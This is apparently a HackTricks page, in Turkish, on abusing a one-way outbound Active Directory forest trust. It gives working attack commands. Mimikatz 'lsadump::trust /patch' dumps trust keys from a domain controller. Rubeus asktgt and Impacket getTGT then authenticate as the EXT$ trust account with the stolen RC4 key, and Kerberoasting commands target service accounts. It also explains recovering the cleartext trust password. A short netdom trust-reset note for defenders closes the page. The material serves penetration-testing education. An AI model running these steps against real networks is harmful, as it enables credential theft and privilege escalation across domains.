# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

Bu senaryoda **alanınız**, **farklı bir domain/forest** içindeki principal'lara bazı **privileges** için **güven** duyar.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
AD modülü kullanılabiliyorsa, **Trusted Domain Object (TDO)**’yu da doğrudan inceleyin. Bu size, daha sonra kolay yolun **FSP/group abuse** mu yoksa **trust-account abuse** mu olduğuna karar verirken ihtiyaç duyacağınız ham LDAP-backed trust verisini verir:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Ayrıca `CN=ForeignSecurityPrincipals` içindeki foreign principals için erişimin gerçekte nerede verildiğini de numaralandırmalısınız. Yaygın kazançlar:

- Current domain’ınızdaki bir server/DC üzerinde **Local admin**
- Users/computers/GPOs üzerinde ACLs olan bir **custom domain group** üyeliği
- Sonradan trust configuration izin verirse [RBCD](resource-based-constrained-delegation.md) haline gelebilecek **computer objects** değiştirme hakları

## Trust Account Attack

Domain/forest **B**’den domain/forest **A**’ya tek yönlü bir trust oluşturulduğunda (**B trusts A**), **B** için **A** içinde bir **trust account** oluşturulur. **A**’nın outbound-trust görünümünde bu faydalıdır; çünkü daha sonra **B**’yi (trusting side) compromise ederseniz, trust secret’ı orada dump edip `B$` olarak **A**’ya geri authenticate olabilirsiniz.

Burada anlaşılması gereken kritik nokta, bu trust account için password ve Kerberos material’ının, **trusting** domain içindeki bir Domain Controller’dan şunun kullanılarak çıkarılabilmesidir:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Bu, **trusted** domain içinde oluşturulan trust account etkin bir principal olduğu ve orada normal bir domain user’ın temel haklarına sahip olduğu için çalışır. Bu, çoğu zaman LDAP enumerate etmeye başlamak, ticket request etmek ve bir sonraki escalation path’i bulmak için yeterlidir.

`ext.local` **trusting** domain ve `root.local` **trusted** domain olduğu bir senaryoda, `root.local` içinde `EXT$` adlı bir user account oluşturulur. `ext.local` içinden trust keys dump etmek, `root.local\EXT$` olarak `root.local` against kullanılabilecek credentials ortaya çıkarır:
```bash
lsadump::trust /patch
```
Bunun ardından, çıkarılan **RC4** anahtarını `root.local\EXT$` olarak `root.local` içinde kimlik doğrulaması yapmak için kullanın:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Ardından güvenilir domain’i o principal olarak enumerate edin, örneğin `root.local` içindeki yüksek değerli bir SPN’i Kerberoasting yaparak:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Linux'tan

**RC4** trust-account anahtarını kurtardıysanız, aynı fikir Linux'tan Impacket ile de çalışır:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Eğer **RC4** kabul edilmiyorsa, kurtarılan **cleartext password**’a (veya türetilmiş **AES** anahtarlarına) geri dönün ve bu foothold’tan alıştığınız [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) ve [Kerberoast](kerberoast.md) akışlarını yeniden kullanın.

### Key material gotchas

**Trust keys** ile **trust-account credentials**’ı karıştırmayın:

- One-way trust’ta her iki taraf da bir **TDO** saklar, ancak gerçek **`EXT$` user account** yalnızca trusted domain’de bulunur.
- Mevcut trust-account password, TDO trust secret içinde yansıtılır (`NewPassword` / current trust key).
- **RC4** trust key, trust account olarak `asktgt` için yeniden kullanılması en kolay artefakttır; varsayılan kurulumlarda bu genellikle çalışan enctype’dır çünkü trust account çoğu zaman boş bir `msDS-SupportedEncryptionTypes` değerine sahiptir.
- Eğer **AES trust keys** açısından düşünüyorsanız, salt’lar farklı olduğu için bunların trust-account AES keys ile değiştirilebilir olmadığını unutmayın.

Bu sayfadaki teknik için, dumped edilmiş **RC4** material’ı veya kurtarılan **cleartext** password’ı tercih edin.

### Gathering cleartext trust password

Önceki akışta **cleartext password** yerine trust hash kullanılmıştı (bu da **mimikatz** tarafından dump edilir).

Cleartext password, mimikatz’taki \[ CLEAR ] output’unu hexadecimal’den dönüştürüp null byte’ları `\x00` kaldırarak elde edilebilir:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

Bazen bir trust relationship oluşturulurken, trust için kullanıcı tarafından bir password girilmesi gerekir. Bu demonstrasyonda key orijinal trust password’dür ve bu yüzden insan tarafından okunabilir. Key rotate oldukça (default: her 30 gün), cleartext genellikle artık insan tarafından okunabilir olmaktan çıkar ancak teknik olarak hâlâ kullanılabilir.

Cleartext password, trust account olarak normal authentication yapmak için kullanılabilir; bu, trust account’un Kerberos secret key’i ile TGT istemeye bir alternatiftir. Burada, `ext.local` içinden `root.local` üzerinde `Domain Admins` üyelerini sorgulama:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust account’lar tuhaf principals’tır. **RUNAS / console / RDP** gibi interactive logon’lar burada beklenen yol değildir ve **NTLM** authentication denemeleri `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT` ile başarısız olabilir. Bunun yerine **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) için plan yapın.

### Persistence / cleanup note

Savunucular trusting domain’in compromise olduğunu anlarsa, trust secret’ı **her iki tarafta** da `netdom trust ... /resetOneSide ...` ile rotate etmelidirler. Operatör açısından bu önemlidir çünkü bir **manual reset eski trust material’ı hemen geçersiz kılar**, normal trust-password rotation ise rollover sırasında mevcut/önceki değerleri bir süre daha korur.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Referanslar

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
